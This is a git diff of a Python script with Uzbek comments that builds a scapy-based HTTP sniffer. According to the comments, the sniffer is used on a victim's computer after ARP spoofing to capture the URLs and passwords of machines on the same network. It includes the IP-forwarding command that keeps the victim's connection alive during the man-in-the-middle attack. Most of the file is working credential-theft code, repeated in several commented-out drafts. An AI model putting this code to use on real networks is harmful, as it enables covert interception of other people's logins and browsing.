@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #Dasturni ishga tushurgach jabrlanuvchi kampyuterida internet ishlamay qolsa quyudagi kod kiritiladi
 #echo 1 > /proc/sys/net/ipv4/ip_forward
-import http
+# import http
 
 #ARPspoof orali jabrlanuvchi kampyuterini bizning kampyuterga burib olib so'ngra barcha packetlarni o'qiymiz
 # import scapy.all as scapy
@@ -28,14 +28,71 @@ import scapy.all as scapy
 
     #http packetlarini saralashimiz uchun pip yordamida scapy_http ni o'rnatishimiz kerak bo'ladi.
 
+# import scapy.all as scapy
+# from scapy.layers import http
+#
+# def sniff(interface):
+#     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet) #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
+#
+# def process_sniff_packet(packet):
+#     if packet.haslayer(http.HTTPRequest): #haslayer scapy ichida mavjud bo'lib u darajani tekshiradi. yani http darajadagi packet bor yoki yo'q
+#         print(packet)#Barcha kelayotgan packetlarni ekranga chiqarish
+#
+# sniff("wlan0")
+
+    #Qo'lda kiritilgan packetlarni tahlil qilish va polyalarga kirish
+
+#Agar biz dasturni cmd da ishga tushurayotgan bo'lsak faqatgina 5000 qatornigini chiqarib beradi. Agar bizga kerakli ma'lumot bu polyaga sig'may qolsa biz kungan natijaga erisha olmaymiz
+#Shuning uchun cmd ni sozlab olamib qatorlar sonini ko'paytirishimiz kerak bo'ladi
+#
+# import scapy.all as scapy
+# from scapy.layers import http
+#
+# def sniff(interface):
+#     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet) #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
+#
+# def process_sniff_packet(packet):
+#     if packet.haslayer(http.HTTPRequest): #haslayer scapy ichida mavjud bo'lib u darajani tekshiradi. yani http darajadagi packet bor yoki yo'q
+#         if packet.haslayer(scapy.Raw): #Row packetdagi parol yoziladigan qism
+#             print(packet[scapy.Raw].load)#scapy.Raw - packetdagi row darajasini chiqarish. load - row darajasi ichidagi load qiymati polya hisoblanadi
+#
+# sniff("eth0")
+
+    #URL-manzillarni qo'lga kiritish
+#
+# import scapy.all as scapy
+# from scapy.layers import http
+#
+# def sniff(interface):
+#     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet) #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
+#
+# def process_sniff_packet(packet):
+#     if packet.haslayer(http.HTTPRequest): #haslayer scapy ichida mavjud bo'lib u darajani tekshiradi. yani http darajadagi packet bor yoki yo'q
+#         print(packet.show())
+#         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # http packet ichida HTTPRequest darajasida Host va Path qismlarini birga chiqaradi
+#         print(url)
+#         if packet.haslayer(scapy.Raw): #Row packetdagi parol yoziladigan qism
+#             print(packet[scapy.Raw].load)#scapy.Raw - packetdagi row darajasini chiqarish. load - row darajasi ichidagi load qiymati polya hisoblanadi
+#
+# sniff("eth0")
+
+    #Biz bilan bir tarmoqqa ulangan kompyuter parollarini qo'lga kiritish
+
+
 import scapy.all as scapy
 from scapy.layers import http
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniff_packet) #iface-interface, store-xotirada saqlash yoki saqlamaslik, prn-"calback" har doim natija chiqganda kiritilgan funksiya ishlasin.
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host +packet[http.HTTPRequest].Path # http packet ichida HTTPRequest darajasida Host va Path qismlarini birga chiqaradi
+
 def process_sniff_packet(packet):
     if packet.haslayer(http.HTTPRequest): #haslayer scapy ichida mavjud bo'lib u darajani tekshiradi. yani http darajadagi packet bor yoki yo'q
-        print(packet)#Barcha kelayotgan packetlarni ekranga chiqarish
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
+        if packet.haslayer(scapy.Raw): #Row packetdagi parol yoziladigan qism
+            print(packet[scapy.Raw].load) #scapy.Raw - packetdagi row darajasini chiqarish. load - row darajasi ichidagi load qiymati polya hisoblanadi
 
-sniff("wlan0")
+sniff("eth0")
